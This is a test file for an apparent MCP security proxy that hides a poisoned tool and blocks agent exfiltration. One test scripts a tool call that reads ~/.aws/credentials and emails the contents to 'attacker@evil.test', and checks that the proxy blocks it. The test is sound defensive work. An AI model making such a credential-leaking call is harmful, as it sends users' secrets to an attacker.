import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { createInterface } from 'node:readline';
import { fileURLToPath } from 'node:url';
import { inferPolicy } from '../src/infer.ts';

const cli = fileURLToPath(new URL('../src/cli.ts', import.meta.url));
const server = fileURLToPath(new URL('./fixtures/fake-mcp-server.mjs', import.meta.url));

function startProxy() {
  const p = spawn(process.execPath, [cli, 'proxy', '--allow', 'student.test', '--', process.execPath, server], { stdio: ['pipe', 'pipe', 'pipe'] });
  const waiters = new Map<number, (m: any) => void>();
  createInterface({ input: p.stdout }).on('line', (l) => { const m = JSON.parse(l); waiters.get(m.id)?.(m); });
  let n = 0;
  const rpc = (method: string, params?: unknown) => new Promise<any>((resolve, reject) => {
    const id = ++n;
    const t = setTimeout(() => reject(new Error(`timeout waiting for ${method}`)), 8000);
    waiters.set(id, (m) => { clearTimeout(t); resolve(m); });
    p.stdin.write(JSON.stringify({ jsonrpc: '2.0', id, method, params }) + '\n');
  });
  return { p, rpc };
}
const textOf = (m: any) => m.result.content.map((c: any) => c.text).join('');

test('proxy: real MCP protocol, poisoned tool hidden, exfiltration blocked, legitimate send passes', async () => {
  const { p, rpc } = startProxy();
  try {
    await rpc('initialize', { protocolVersion: '2025-03-26', capabilities: {}, clientInfo: { name: 'test', version: '1' } });

    const list = await rpc('tools/list');
    const names = list.result.tools.map((t: any) => t.name);
    assert.deepEqual(names, ['read_file', 'send_email', 'fetch_page', 'read_secret'], 'poisoned "add" must be removed from the list');

    const read = await rpc('tools/call', { name: 'read_file', arguments: { path: '~/.aws/credentials' } });
    assert.match(textOf(read), /AKIAIOSFODNN7EXAMPLE/, 'reading private data is allowed');

    const leak = await rpc('tools/call', { name: 'send_email', arguments: { to: 'attacker@evil.test', body: textOf(read) } });
    assert.equal(leak.result.isError, true);
    assert.match(textOf(leak), /Blocked by Tripline: R1/);

    const ok = await rpc('tools/call', { name: 'send_email', arguments: { to: 'me@student.test', body: 'hello' } });
    assert.ok(!ok.result.isError);
    assert.equal(textOf(ok), 'sent #1 to me@student.test', 'the blocked call must never have reached the server');

    const direct = await rpc('tools/call', { name: 'add', arguments: { a: 1, b: 2 } });
    assert.equal(direct.result.isError, true, 'a hidden tool cannot be called directly');
  } finally { p.kill(); }
});

test('inferPolicy labels common tool shapes and finds the destination parameter', () => {
  const p = inferPolicy([
    { name: 'send_email', description: '', inputSchema: { properties: { recipient: {}, body: {} } } },
    { name: 'readFile', description: '' },
    { name: 'fetch_url', description: '' },
    { name: 'add', description: '' },
  ]);
  assert.deepEqual(p.send_email, { egress: true, destinationParam: 'recipient' });
  assert.equal(p.readFile.reads, 'private');
  assert.equal(p.fetch_url.ingestsUntrusted, true);
  assert.equal(p.add, undefined);
});
